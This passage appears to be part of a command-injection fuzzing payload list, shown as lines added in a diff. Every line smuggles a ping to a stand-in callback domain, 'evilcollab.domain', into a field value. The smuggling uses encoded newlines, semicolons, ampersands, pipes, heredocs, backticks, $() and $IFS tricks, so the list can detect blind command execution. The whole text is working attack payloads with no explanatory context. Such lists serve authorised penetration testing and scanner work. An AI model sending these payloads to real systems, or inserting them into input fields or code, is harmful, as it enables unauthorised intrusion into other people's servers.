+foo%0a%0a`ping		x1604.lookup.evilcollab.domain`%0a%0a1
+invvvvv212.org"%0a%0a`ping		x1605.lookup.evilcollab.domain`%0a%0a1"
+invvvvv212.org'%0a%0a`ping		x1606.lookup.evilcollab.domain`%0a%0a1'
+1"%0a%0a`ping		x1607.lookup.evilcollab.domain`%0a%0a1"
+1'%0a%0a`ping		x1608.lookup.evilcollab.domain`%0a%0a1'
+foo"%0a%0a`ping		x1609.lookup.evilcollab.domain`%0a%0a1"
+foo'%0a%0a`ping		x1610.lookup.evilcollab.domain`%0a%0a1'
+invvvvv212.org%0a%0a`ping		x1611.lookup.evilcollab.domain`%0a%0afoo
+1%0a%0a`ping		x1612.lookup.evilcollab.domain`%0a%0afoo
+foo%0a%0a`ping		x1613.lookup.evilcollab.domain`%0a%0afoo
+invvvvv212.org"%0a%0a`ping		x1614.lookup.evilcollab.domain`%0a%0afoo"
+invvvvv212.org'%0a%0a`ping		x1615.lookup.evilcollab.domain`%0a%0afoo'
+1"%0a%0a`ping		x1616.lookup.evilcollab.domain`%0a%0afoo"
+1'%0a%0a`ping		x1617.lookup.evilcollab.domain`%0a%0afoo'
+foo"%0a%0a`ping		x1618.lookup.evilcollab.domain`%0a%0afoo"
+foo'%0a%0a`ping		x1619.lookup.evilcollab.domain`%0a%0afoo'
+invvvvv212.org%0d%0d`ping		x1620.lookup.evilcollab.domain`%0d%0dinvvvvv212.org
+1%0d%0d`ping		x1621.lookup.evilcollab.domain`%0d%0dinvvvvv212.org
+foo%0d%0d`ping		x1622.lookup.evilcollab.domain`%0d%0dinvvvvv212.org
+invvvvv212.org"%0d%0d`ping		x1623.lookup.evilcollab.domain`%0d%0dinvvvvv212.org"
+invvvvv212.org'%0d%0d`ping		x1624.lookup.evilcollab.domain`%0d%0dinvvvvv212.org'
+1"%0d%0d`ping		x1625.lookup.evilcollab.domain`%0d%0dinvvvvv212.org"
+1'%0d%0d`ping		x1626.lookup.evilcollab.domain`%0d%0dinvvvvv212.org'
+foo"%0d%0d`ping		x1627.lookup.evilcollab.domain`%0d%0dinvvvvv212.org"
+foo'%0d%0d`ping		x1628.lookup.evilcollab.domain`%0d%0dinvvvvv212.org'
+invvvvv212.org%0d%0d`ping		x1629.lookup.evilcollab.domain`%0d%0d1
+1%0d%0d`ping		x1630.lookup.evilcollab.domain`%0d%0d1
+foo%0d%0d`ping		x1631.lookup.evilcollab.domain`%0d%0d1
+invvvvv212.org"%0d%0d`ping		x1632.lookup.evilcollab.domain`%0d%0d1"
+invvvvv212.org'%0d%0d`ping		x1633.lookup.evilcollab.domain`%0d%0d1'
+1"%0d%0d`ping		x1634.lookup.evilcollab.domain`%0d%0d1"
+1'%0d%0d`ping		x1635.lookup.evilcollab.domain`%0d%0d1'
+foo"%0d%0d`ping		x1636.lookup.evilcollab.domain`%0d%0d1"
+foo'%0d%0d`ping		x1637.lookup.evilcollab.domain`%0d%0d1'
+invvvvv212.org%0d%0d`ping		x1638.lookup.evilcollab.domain`%0d%0dfoo
+1%0d%0d`ping		x1639.lookup.evilcollab.domain`%0d%0dfoo
+foo%0d%0d`ping		x1640.lookup.evilcollab.domain`%0d%0dfoo
+invvvvv212.org"%0d%0d`ping		x1641.lookup.evilcollab.domain`%0d%0dfoo"
+invvvvv212.org'%0d%0d`ping		x1642.lookup.evilcollab.domain`%0d%0dfoo'
+1"%0d%0d`ping		x1643.lookup.evilcollab.domain`%0d%0dfoo"
+1'%0d%0d`ping		x1644.lookup.evilcollab.domain`%0d%0dfoo'
+foo"%0d%0d`ping		x1645.lookup.evilcollab.domain`%0d%0dfoo"
+foo'%0d%0d`ping		x1646.lookup.evilcollab.domain`%0d%0dfoo'
+invvvvv212.org;`ping		x1647.lookup.evilcollab.domain`;invvvvv212.org
+1;`ping		x1648.lookup.evilcollab.domain`;invvvvv212.org
+foo;`ping		x1649.lookup.evilcollab.domain`;invvvvv212.org
+invvvvv212.org";`ping		x1650.lookup.evilcollab.domain`;invvvvv212.org"
+invvvvv212.org';`ping		x1651.lookup.evilcollab.domain`;invvvvv212.org'
+1";`ping		x1652.lookup.evilcollab.domain`;invvvvv212.org"
+1';`ping		x1653.lookup.evilcollab.domain`;invvvvv212.org'
+foo";`ping		x1654.lookup.evilcollab.domain`;invvvvv212.org"
+foo';`ping		x1655.lookup.evilcollab.domain`;invvvvv212.org'
+invvvvv212.org;`ping		x1656.lookup.evilcollab.domain`;1
+1;`ping		x1657.lookup.evilcollab.domain`;1
+foo;`ping		x1658.lookup.evilcollab.domain`;1
+invvvvv212.org";`ping		x1659.lookup.evilcollab.domain`;1"
+invvvvv212.org';`ping		x1660.lookup.evilcollab.domain`;1'
+1";`ping		x1661.lookup.evilcollab.domain`;1"
+1';`ping		x1662.lookup.evilcollab.domain`;1'
+foo";`ping		x1663.lookup.evilcollab.domain`;1"
+foo';`ping		x1664.lookup.evilcollab.domain`;1'
+invvvvv212.org;`ping		x1665.lookup.evilcollab.domain`;foo
+1;`ping		x1666.lookup.evilcollab.domain`;foo
+foo;`ping		x1667.lookup.evilcollab.domain`;foo
+invvvvv212.org";`ping		x1668.lookup.evilcollab.domain`;foo"
+invvvvv212.org';`ping		x1669.lookup.evilcollab.domain`;foo'
+1";`ping		x1670.lookup.evilcollab.domain`;foo"
+1';`ping		x1671.lookup.evilcollab.domain`;foo'
+foo";`ping		x1672.lookup.evilcollab.domain`;foo"
+foo';`ping		x1673.lookup.evilcollab.domain`;foo'
+invvvvv212.org%26`ping		x1674.lookup.evilcollab.domain`%26invvvvv212.org
+1%26`ping		x1675.lookup.evilcollab.domain`%26invvvvv212.org
+foo%26`ping		x1676.lookup.evilcollab.domain`%26invvvvv212.org
+invvvvv212.org"%26`ping		x1677.lookup.evilcollab.domain`%26invvvvv212.org"
+invvvvv212.org'%26`ping		x1678.lookup.evilcollab.domain`%26invvvvv212.org'
+1"%26`ping		x1679.lookup.evilcollab.domain`%26invvvvv212.org"
+1'%26`ping		x1680.lookup.evilcollab.domain`%26invvvvv212.org'
+foo"%26`ping		x1681.lookup.evilcollab.domain`%26invvvvv212.org"
+foo'%26`ping		x1682.lookup.evilcollab.domain`%26invvvvv212.org'
+invvvvv212.org%26`ping		x1683.lookup.evilcollab.domain`%261
+1%26`ping		x1684.lookup.evilcollab.domain`%261
+foo%26`ping		x1685.lookup.evilcollab.domain`%261
+invvvvv212.org"%26`ping		x1686.lookup.evilcollab.domain`%261"
+invvvvv212.org'%26`ping		x1687.lookup.evilcollab.domain`%261'
+1"%26`ping		x1688.lookup.evilcollab.domain`%261"
+1'%26`ping		x1689.lookup.evilcollab.domain`%261'
+foo"%26`ping		x1690.lookup.evilcollab.domain`%261"
+foo'%26`ping		x1691.lookup.evilcollab.domain`%261'
+invvvvv212.org%26`ping		x1692.lookup.evilcollab.domain`%26foo
+1%26`ping		x1693.lookup.evilcollab.domain`%26foo
+foo%26`ping		x1694.lookup.evilcollab.domain`%26foo
+invvvvv212.org"%26`ping		x1695.lookup.evilcollab.domain`%26foo"
+invvvvv212.org'%26`ping		x1696.lookup.evilcollab.domain`%26foo'
+1"%26`ping		x1697.lookup.evilcollab.domain`%26foo"
+1'%26`ping		x1698.lookup.evilcollab.domain`%26foo'
+foo"%26`ping		x1699.lookup.evilcollab.domain`%26foo"
+foo'%26`ping		x1700.lookup.evilcollab.domain`%26foo'
+invvvvv212.org|`ping		x1701.lookup.evilcollab.domain`|invvvvv212.org
+1|`ping		x1702.lookup.evilcollab.domain`|invvvvv212.org
+foo|`ping		x1703.lookup.evilcollab.domain`|invvvvv212.org
+invvvvv212.org"|`ping		x1704.lookup.evilcollab.domain`|invvvvv212.org"
+invvvvv212.org'|`ping		x1705.lookup.evilcollab.domain`|invvvvv212.org'
+1"|`ping		x1706.lookup.evilcollab.domain`|invvvvv212.org"
+1'|`ping		x1707.lookup.evilcollab.domain`|invvvvv212.org'
+foo"|`ping		x1708.lookup.evilcollab.domain`|invvvvv212.org"
+foo'|`ping		x1709.lookup.evilcollab.domain`|invvvvv212.org'
+invvvvv212.org|`ping		x1710.lookup.evilcollab.domain`|1
+1|`ping		x1711.lookup.evilcollab.domain`|1
+foo|`ping		x1712.lookup.evilcollab.domain`|1
+invvvvv212.org"|`ping		x1713.lookup.evilcollab.domain`|1"
+invvvvv212.org'|`ping		x1714.lookup.evilcollab.domain`|1'
+1"|`ping		x1715.lookup.evilcollab.domain`|1"
+1'|`ping		x1716.lookup.evilcollab.domain`|1'
+foo"|`ping		x1717.lookup.evilcollab.domain`|1"
+foo'|`ping		x1718.lookup.evilcollab.domain`|1'
+invvvvv212.org|`ping		x1719.lookup.evilcollab.domain`|foo
+1|`ping		x1720.lookup.evilcollab.domain`|foo
+foo|`ping		x1721.lookup.evilcollab.domain`|foo
+invvvvv212.org"|`ping		x1722.lookup.evilcollab.domain`|foo"
+invvvvv212.org'|`ping		x1723.lookup.evilcollab.domain`|foo'
+1"|`ping		x1724.lookup.evilcollab.domain`|foo"
+1'|`ping		x1725.lookup.evilcollab.domain`|foo'
+foo"|`ping		x1726.lookup.evilcollab.domain`|foo"
+foo'|`ping		x1727.lookup.evilcollab.domain`|foo'
+invvvvv212.org<<D%0aD%0a`ping		x1728.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org
+1<<D%0aD%0a`ping		x1729.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org
+foo<<D%0aD%0a`ping		x1730.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org
+invvvvv212.org"<<D%0aD%0a`ping		x1731.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org"
+invvvvv212.org'<<D%0aD%0a`ping		x1732.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org'
+1"<<D%0aD%0a`ping		x1733.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org"
+1'<<D%0aD%0a`ping		x1734.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org'
+foo"<<D%0aD%0a`ping		x1735.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org"
+foo'<<D%0aD%0a`ping		x1736.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org'
+invvvvv212.org<<D%0aD%0a`ping		x1737.lookup.evilcollab.domain`<<D%0aD%0a1
+1<<D%0aD%0a`ping		x1738.lookup.evilcollab.domain`<<D%0aD%0a1
+foo<<D%0aD%0a`ping		x1739.lookup.evilcollab.domain`<<D%0aD%0a1
+invvvvv212.org"<<D%0aD%0a`ping		x1740.lookup.evilcollab.domain`<<D%0aD%0a1"
+invvvvv212.org'<<D%0aD%0a`ping		x1741.lookup.evilcollab.domain`<<D%0aD%0a1'
+1"<<D%0aD%0a`ping		x1742.lookup.evilcollab.domain`<<D%0aD%0a1"
+1'<<D%0aD%0a`ping		x1743.lookup.evilcollab.domain`<<D%0aD%0a1'
+foo"<<D%0aD%0a`ping		x1744.lookup.evilcollab.domain`<<D%0aD%0a1"
+foo'<<D%0aD%0a`ping		x1745.lookup.evilcollab.domain`<<D%0aD%0a1'
+invvvvv212.org<<D%0aD%0a`ping		x1746.lookup.evilcollab.domain`<<D%0aD%0afoo
+1<<D%0aD%0a`ping		x1747.lookup.evilcollab.domain`<<D%0aD%0afoo
+foo<<D%0aD%0a`ping		x1748.lookup.evilcollab.domain`<<D%0aD%0afoo
+invvvvv212.org"<<D%0aD%0a`ping		x1749.lookup.evilcollab.domain`<<D%0aD%0afoo"
+invvvvv212.org'<<D%0aD%0a`ping		x1750.lookup.evilcollab.domain`<<D%0aD%0afoo'
+1"<<D%0aD%0a`ping		x1751.lookup.evilcollab.domain`<<D%0aD%0afoo"
+1'<<D%0aD%0a`ping		x1752.lookup.evilcollab.domain`<<D%0aD%0afoo'
+foo"<<D%0aD%0a`ping		x1753.lookup.evilcollab.domain`<<D%0aD%0afoo"
+foo'<<D%0aD%0a`ping		x1754.lookup.evilcollab.domain`<<D%0aD%0afoo'
+invvvvv212.org%0a%0aping$IFS$9x1755.lookup.evilcollab.domain%0a%0ainvvvvv212.org
+1%0a%0aping$IFS$9x1756.lookup.evilcollab.domain%0a%0ainvvvvv212.org
+foo%0a%0aping$IFS$9x1757.lookup.evilcollab.domain%0a%0ainvvvvv212.org
+invvvvv212.org"%0a%0aping$IFS$9x1758.lookup.evilcollab.domain%0a%0ainvvvvv212.org"
+invvvvv212.org'%0a%0aping$IFS$9x1759.lookup.evilcollab.domain%0a%0ainvvvvv212.org'
+1"%0a%0aping$IFS$9x1760.lookup.evilcollab.domain%0a%0ainvvvvv212.org"
+1'%0a%0aping$IFS$9x1761.lookup.evilcollab.domain%0a%0ainvvvvv212.org'
+foo"%0a%0aping$IFS$9x1762.lookup.evilcollab.domain%0a%0ainvvvvv212.org"
+foo'%0a%0aping$IFS$9x1763.lookup.evilcollab.domain%0a%0ainvvvvv212.org'
+invvvvv212.org%0a%0aping$IFS$9x1764.lookup.evilcollab.domain%0a%0a1
+1%0a%0aping$IFS$9x1765.lookup.evilcollab.domain%0a%0a1
+foo%0a%0aping$IFS$9x1766.lookup.evilcollab.domain%0a%0a1
+invvvvv212.org"%0a%0aping$IFS$9x1767.lookup.evilcollab.domain%0a%0a1"
+invvvvv212.org'%0a%0aping$IFS$9x1768.lookup.evilcollab.domain%0a%0a1'
+1"%0a%0aping$IFS$9x1769.lookup.evilcollab.domain%0a%0a1"
+1'%0a%0aping$IFS$9x1770.lookup.evilcollab.domain%0a%0a1'
+foo"%0a%0aping$IFS$9x1771.lookup.evilcollab.domain%0a%0a1"
+foo'%0a%0aping$IFS$9x1772.lookup.evilcollab.domain%0a%0a1'
+invvvvv212.org%0a%0aping$IFS$9x1773.lookup.evilcollab.domain%0a%0afoo
+1%0a%0aping$IFS$9x1774.lookup.evilcollab.domain%0a%0afoo
+foo%0a%0aping$IFS$9x1775.lookup.evilcollab.domain%0a%0afoo
+invvvvv212.org"%0a%0aping$IFS$9x1776.lookup.evilcollab.domain%0a%0afoo"
+invvvvv212.org'%0a%0aping$IFS$9x1777.lookup.evilcollab.domain%0a%0afoo'
+1"%0a%0aping$IFS$9x1778.lookup.evilcollab.domain%0a%0afoo"
+1'%0a%0aping$IFS$9x1779.lookup.evilcollab.domain%0a%0afoo'
+foo"%0a%0aping$IFS$9x1780.lookup.evilcollab.domain%0a%0afoo"
+foo'%0a%0aping$IFS$9x1781.lookup.evilcollab.domain%0a%0afoo'
+invvvvv212.org%0d%0dping$IFS$9x1782.lookup.evilcollab.domain%0d%0dinvvvvv212.org
+1%0d%0dping$IFS$9x1783.lookup.evilcollab.domain%0d%0dinvvvvv212.org
+foo%0d%0dping$IFS$9x1784.lookup.evilcollab.domain%0d%0dinvvvvv212.org
+invvvvv212.org"%0d%0dping$IFS$9x1785.lookup.evilcollab.domain%0d%0dinvvvvv212.org"
+invvvvv212.org'%0d%0dping$IFS$9x1786.lookup.evilcollab.domain%0d%0dinvvvvv212.org'
+1"%0d%0dping$IFS$9x1787.lookup.evilcollab.domain%0d%0dinvvvvv212.org"
+1'%0d%0dping$IFS$9x1788.lookup.evilcollab.domain%0d%0dinvvvvv212.org'
+foo"%0d%0dping$IFS$9x1789.lookup.evilcollab.domain%0d%0dinvvvvv212.org"
+foo'%0d%0dping$IFS$9x1790.lookup.evilcollab.domain%0d%0dinvvvvv212.org'
+invvvvv212.org%0d%0dping$IFS$9x1791.lookup.evilcollab.domain%0d%0d1
+1%0d%0dping$IFS$9x1792.lookup.evilcollab.domain%0d%0d1
+foo%0d%0dping$IFS$9x1793.lookup.evilcollab.domain%0d%0d1
+invvvvv212.org"%0d%0dping$IFS$9x1794.lookup.evilcollab.domain%0d%0d1"
+invvvvv212.org'%0d%0dping$IFS$9x1795.lookup.evilcollab.domain%0d%0d1'
+1"%0d%0dping$IFS$9x1796.lookup.evilcollab.domain%0d%0d1"
+1'%0d%0dping$IFS$9x1797.lookup.evilcollab.domain%0d%0d1'
+foo"%0d%0dping$IFS$9x1798.lookup.evilcollab.domain%0d%0d1"
+foo'%0d%0dping$IFS$9x1799.lookup.evilcollab.domain%0d%0d1'
+invvvvv212.org%0d%0dping$IFS$9x1800.lookup.evilcollab.domain%0d%0dfoo
+1%0d%0dping$IFS$9x1801.lookup.evilcollab.domain%0d%0dfoo
+foo%0d%0dping$IFS$9x1802.lookup.evilcollab.domain%0d%0dfoo
+invvvvv212.org"%0d%0dping$IFS$9x1803.lookup.evilcollab.domain%0d%0dfoo"
+invvvvv212.org'%0d%0dping$IFS$9x1804.lookup.evilcollab.domain%0d%0dfoo'
+1"%0d%0dping$IFS$9x1805.lookup.evilcollab.domain%0d%0dfoo"
+1'%0d%0dping$IFS$9x1806.lookup.evilcollab.domain%0d%0dfoo'
+foo"%0d%0dping$IFS$9x1807.lookup.evilcollab.domain%0d%0dfoo"
+foo'%0d%0dping$IFS$9x1808.lookup.evilcollab.domain%0d%0dfoo'
+invvvvv212.org;ping$IFS$9x1809.lookup.evilcollab.domain;invvvvv212.org
+1;ping$IFS$9x1810.lookup.evilcollab.domain;invvvvv212.org
+foo;ping$IFS$9x1811.lookup.evilcollab.domain;invvvvv212.org
+invvvvv212.org";ping$IFS$9x1812.lookup.evilcollab.domain;invvvvv212.org"
+invvvvv212.org';ping$IFS$9x1813.lookup.evilcollab.domain;invvvvv212.org'
+1";ping$IFS$9x1814.lookup.evilcollab.domain;invvvvv212.org"
+1';ping$IFS$9x1815.lookup.evilcollab.domain;invvvvv212.org'
+foo";ping$IFS$9x1816.lookup.evilcollab.domain;invvvvv212.org"
+foo';ping$IFS$9x1817.lookup.evilcollab.domain;invvvvv212.org'
+invvvvv212.org;ping$IFS$9x1818.lookup.evilcollab.domain;1
+1;ping$IFS$9x1819.lookup.evilcollab.domain;1
+foo;ping$IFS$9x1820.lookup.evilcollab.domain;1
+invvvvv212.org";ping$IFS$9x1821.lookup.evilcollab.domain;1"
+invvvvv212.org';ping$IFS$9x1822.lookup.evilcollab.domain;1'
+1";ping$IFS$9x1823.lookup.evilcollab.domain;1"
+1';ping$IFS$9x1824.lookup.evilcollab.domain;1'
+foo";ping$IFS$9x1825.lookup.evilcollab.domain;1"
+foo';ping$IFS$9x1826.lookup.evilcollab.domain;1'
+invvvvv212.org;ping$IFS$9x1827.lookup.evilcollab.domain;foo
+1;ping$IFS$9x1828.lookup.evilcollab.domain;foo
+foo;ping$IFS$9x1829.lookup.evilcollab.domain;foo
+invvvvv212.org";ping$IFS$9x1830.lookup.evilcollab.domain;foo"
+invvvvv212.org';ping$IFS$9x1831.lookup.evilcollab.domain;foo'
+1";ping$IFS$9x1832.lookup.evilcollab.domain;foo"
+1';ping$IFS$9x1833.lookup.evilcollab.domain;foo'
+foo";ping$IFS$9x1834.lookup.evilcollab.domain;foo"
+foo';ping$IFS$9x1835.lookup.evilcollab.domain;foo'
+invvvvv212.org%26ping$IFS$9x1836.lookup.evilcollab.domain%26invvvvv212.org
+1%26ping$IFS$9x1837.lookup.evilcollab.domain%26invvvvv212.org
+foo%26ping$IFS$9x1838.lookup.evilcollab.domain%26invvvvv212.org
+invvvvv212.org"%26ping$IFS$9x1839.lookup.evilcollab.domain%26invvvvv212.org"
+invvvvv212.org'%26ping$IFS$9x1840.lookup.evilcollab.domain%26invvvvv212.org'
+1"%26ping$IFS$9x1841.lookup.evilcollab.domain%26invvvvv212.org"
+1'%26ping$IFS$9x1842.lookup.evilcollab.domain%26invvvvv212.org'
+foo"%26ping$IFS$9x1843.lookup.evilcollab.domain%26invvvvv212.org"
+foo'%26ping$IFS$9x1844.lookup.evilcollab.domain%26invvvvv212.org'
+invvvvv212.org%26ping$IFS$9x1845.lookup.evilcollab.domain%261
+1%26ping$IFS$9x1846.lookup.evilcollab.domain%261
+foo%26ping$IFS$9x1847.lookup.evilcollab.domain%261
+invvvvv212.org"%26ping$IFS$9x1848.lookup.evilcollab.domain%261"
+invvvvv212.org'%26ping$IFS$9x1849.lookup.evilcollab.domain%261'
+1"%26ping$IFS$9x1850.lookup.evilcollab.domain%261"
+1'%26ping$IFS$9x1851.lookup.evilcollab.domain%261'
+foo"%26ping$IFS$9x1852.lookup.evilcollab.domain%261"
+foo'%26ping$IFS$9x1853.lookup.evilcollab.domain%261'
+invvvvv212.org%26ping$IFS$9x1854.lookup.evilcollab.domain%26foo
+1%26ping$IFS$9x1855.lookup.evilcollab.domain%26foo
+foo%26ping$IFS$9x1856.lookup.evilcollab.domain%26foo
+invvvvv212.org"%26ping$IFS$9x1857.lookup.evilcollab.domain%26foo"
+invvvvv212.org'%26ping$IFS$9x1858.lookup.evilcollab.domain%26foo'
+1"%26ping$IFS$9x1859.lookup.evilcollab.domain%26foo"
+1'%26ping$IFS$9x1860.lookup.evilcollab.domain%26foo'
+foo"%26ping$IFS$9x1861.lookup.evilcollab.domain%26foo"
+foo'%26ping$IFS$9x1862.lookup.evilcollab.domain%26foo'
+invvvvv212.org|ping$IFS$9x1863.lookup.evilcollab.domain|invvvvv212.org
+1|ping$IFS$9x1864.lookup.evilcollab.domain|invvvvv212.org
+foo|ping$IFS$9x1865.lookup.evilcollab.domain|invvvvv212.org
+invvvvv212.org"|ping$IFS$9x1866.lookup.evilcollab.domain|invvvvv212.org"
+invvvvv212.org'|ping$IFS$9x1867.lookup.evilcollab.domain|invvvvv212.org'
+1"|ping$IFS$9x1868.lookup.evilcollab.domain|invvvvv212.org"
+1'|ping$IFS$9x1869.lookup.evilcollab.domain|invvvvv212.org'
+foo"|ping$IFS$9x1870.lookup.evilcollab.domain|invvvvv212.org"
+foo'|ping$IFS$9x1871.lookup.evilcollab.domain|invvvvv212.org'
+invvvvv212.org|ping$IFS$9x1872.lookup.evilcollab.domain|1
+1|ping$IFS$9x1873.lookup.evilcollab.domain|1
+foo|ping$IFS$9x1874.lookup.evilcollab.domain|1
+invvvvv212.org"|ping$IFS$9x1875.lookup.evilcollab.domain|1"
+invvvvv212.org'|ping$IFS$9x1876.lookup.evilcollab.domain|1'
+1"|ping$IFS$9x1877.lookup.evilcollab.domain|1"
+1'|ping$IFS$9x1878.lookup.evilcollab.domain|1'
+foo"|ping$IFS$9x1879.lookup.evilcollab.domain|1"
+foo'|ping$IFS$9x1880.lookup.evilcollab.domain|1'
+invvvvv212.org|ping$IFS$9x1881.lookup.evilcollab.domain|foo
+1|ping$IFS$9x1882.lookup.evilcollab.domain|foo
+foo|ping$IFS$9x1883.lookup.evilcollab.domain|foo
+invvvvv212.org"|ping$IFS$9x1884.lookup.evilcollab.domain|foo"
+invvvvv212.org'|ping$IFS$9x1885.lookup.evilcollab.domain|foo'
+1"|ping$IFS$9x1886.lookup.evilcollab.domain|foo"
+1'|ping$IFS$9x1887.lookup.evilcollab.domain|foo'
+foo"|ping$IFS$9x1888.lookup.evilcollab.domain|foo"
+foo'|ping$IFS$9x1889.lookup.evilcollab.domain|foo'
+invvvvv212.org<<D%0aD%0aping$IFS$9x1890.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org
+1<<D%0aD%0aping$IFS$9x1891.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org
+foo<<D%0aD%0aping$IFS$9x1892.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org
+invvvvv212.org"<<D%0aD%0aping$IFS$9x1893.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org"
+invvvvv212.org'<<D%0aD%0aping$IFS$9x1894.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org'
+1"<<D%0aD%0aping$IFS$9x1895.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org"
+1'<<D%0aD%0aping$IFS$9x1896.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org'
+foo"<<D%0aD%0aping$IFS$9x1897.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org"
+foo'<<D%0aD%0aping$IFS$9x1898.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org'
+invvvvv212.org<<D%0aD%0aping$IFS$9x1899.lookup.evilcollab.domain<<D%0aD%0a1
+1<<D%0aD%0aping$IFS$9x1900.lookup.evilcollab.domain<<D%0aD%0a1
+foo<<D%0aD%0aping$IFS$9x1901.lookup.evilcollab.domain<<D%0aD%0a1
+invvvvv212.org"<<D%0aD%0aping$IFS$9x1902.lookup.evilcollab.domain<<D%0aD%0a1"
+invvvvv212.org'<<D%0aD%0aping$IFS$9x1903.lookup.evilcollab.domain<<D%0aD%0a1'
+1"<<D%0aD%0aping$IFS$9x1904.lookup.evilcollab.domain<<D%0aD%0a1"
+1'<<D%0aD%0aping$IFS$9x1905.lookup.evilcollab.domain<<D%0aD%0a1'
+foo"<<D%0aD%0aping$IFS$9x1906.lookup.evilcollab.domain<<D%0aD%0a1"
+foo'<<D%0aD%0aping$IFS$9x1907.lookup.evilcollab.domain<<D%0aD%0a1'
+invvvvv212.org<<D%0aD%0aping$IFS$9x1908.lookup.evilcollab.domain<<D%0aD%0afoo
+1<<D%0aD%0aping$IFS$9x1909.lookup.evilcollab.domain<<D%0aD%0afoo
+foo<<D%0aD%0aping$IFS$9x1910.lookup.evilcollab.domain<<D%0aD%0afoo
+invvvvv212.org"<<D%0aD%0aping$IFS$9x1911.lookup.evilcollab.domain<<D%0aD%0afoo"
+invvvvv212.org'<<D%0aD%0aping$IFS$9x1912.lookup.evilcollab.domain<<D%0aD%0afoo'
+1"<<D%0aD%0aping$IFS$9x1913.lookup.evilcollab.domain<<D%0aD%0afoo"
+1'<<D%0aD%0aping$IFS$9x1914.lookup.evilcollab.domain<<D%0aD%0afoo'
+foo"<<D%0aD%0aping$IFS$9x1915.lookup.evilcollab.domain<<D%0aD%0afoo"
+foo'<<D%0aD%0aping$IFS$9x1916.lookup.evilcollab.domain<<D%0aD%0afoo'
+invvvvv212.org%0a%0a$(ping$IFS$9x1917.lookup.evilcollab.domain)%0a%0ainvvvvv212.org
+1%0a%0a$(ping$IFS$9x1918.lookup.evilcollab.domain)%0a%0ainvvvvv212.org
+foo%0a%0a$(ping$IFS$9x1919.lookup.evilcollab.domain)%0a%0ainvvvvv212.org
+invvvvv212.org"%0a%0a$(ping$IFS$9x1920.lookup.evilcollab.domain)%0a%0ainvvvvv212.org"
+invvvvv212.org'%0a%0a$(ping$IFS$9x1921.lookup.evilcollab.domain)%0a%0ainvvvvv212.org'
+1"%0a%0a$(ping$IFS$9x1922.lookup.evilcollab.domain)%0a%0ainvvvvv212.org"
+1'%0a%0a$(ping$IFS$9x1923.lookup.evilcollab.domain)%0a%0ainvvvvv212.org'
+foo"%0a%0a$(ping$IFS$9x1924.lookup.evilcollab.domain)%0a%0ainvvvvv212.org"
+foo'%0a%0a$(ping$IFS$9x1925.lookup.evilcollab.domain)%0a%0ainvvvvv212.org'
+invvvvv212.org%0a%0a$(ping$IFS$9x1926.lookup.evilcollab.domain)%0a%0a1
+1%0a%0a$(ping$IFS$9x1927.lookup.evilcollab.domain)%0a%0a1
+foo%0a%0a$(ping$IFS$9x1928.lookup.evilcollab.domain)%0a%0a1
+invvvvv212.org"%0a%0a$(ping$IFS$9x1929.lookup.evilcollab.domain)%0a%0a1"
+invvvvv212.org'%0a%0a$(ping$IFS$9x1930.lookup.evilcollab.domain)%0a%0a1'
+1"%0a%0a$(ping$IFS$9x1931.lookup.evilcollab.domain)%0a%0a1"
+1'%0a%0a$(ping$IFS$9x1932.lookup.evilcollab.domain)%0a%0a1'
+foo"%0a%0a$(ping$IFS$9x1933.lookup.evilcollab.domain)%0a%0a1"
+foo'%0a%0a$(ping$IFS$9x1934.lookup.evilcollab.domain)%0a%0a1'
+invvvvv212.org%0a%0a$(ping$IFS$9x1935.lookup.evilcollab.domain)%0a%0afoo
+1%0a%0a$(ping$IFS$9x1936.lookup.evilcollab.domain)%0a%0afoo
+foo%0a%0a$(ping$IFS$9x1937.lookup.evilcollab.domain)%0a%0afoo
+invvvvv212.org"%0a%0a$(ping$IFS$9x1938.lookup.evilcollab.domain)%0a%0afoo"
+invvvvv212.org'%0a%0a$(ping$IFS$9x1939.lookup.evilcollab.domain)%0a%0afoo'
+1"%0a%0a$(ping$IFS$9x1940.lookup.evilcollab.domain)%0a%0afoo"
+1'%0a%0a$(ping$IFS$9x1941.lookup.evilcollab.domain)%0a%0afoo'
+foo"%0a%0a$(ping$IFS$9x1942.lookup.evilcollab.domain)%0a%0afoo"
+foo'%0a%0a$(ping$IFS$9x1943.lookup.evilcollab.domain)%0a%0afoo'
+invvvvv212.org%0d%0d$(ping$IFS$9x1944.lookup.evilcollab.domain)%0d%0dinvvvvv212.org
+1%0d%0d$(ping$IFS$9x1945.lookup.evilcollab.domain)%0d%0dinvvvvv212.org
+foo%0d%0d$(ping$IFS$9x1946.lookup.evilcollab.domain)%0d%0dinvvvvv212.org
+invvvvv212.org"%0d%0d$(ping$IFS$9x1947.lookup.evilcollab.domain)%0d%0dinvvvvv212.org"
+invvvvv212.org'%0d%0d$(ping$IFS$9x1948.lookup.evilcollab.domain)%0d%0dinvvvvv212.org'
+1"%0d%0d$(ping$IFS$9x1949.lookup.evilcollab.domain)%0d%0dinvvvvv212.org"
+1'%0d%0d$(ping$IFS$9x1950.lookup.evilcollab.domain)%0d%0dinvvvvv212.org'
+foo"%0d%0d$(ping$IFS$9x1951.lookup.evilcollab.domain)%0d%0dinvvvvv212.org"
+foo'%0d%0d$(ping$IFS$9x1952.lookup.evilcollab.domain)%0d%0dinvvvvv212.org'
+invvvvv212.org%0d%0d$(ping$IFS$9x1953.lookup.evilcollab.domain)%0d%0d1
+1%0d%0d$(ping$IFS$9x1954.lookup.evilcollab.domain)%0d%0d1
+foo%0d%0d$(ping$IFS$9x1955.lookup.evilcollab.domain)%0d%0d1
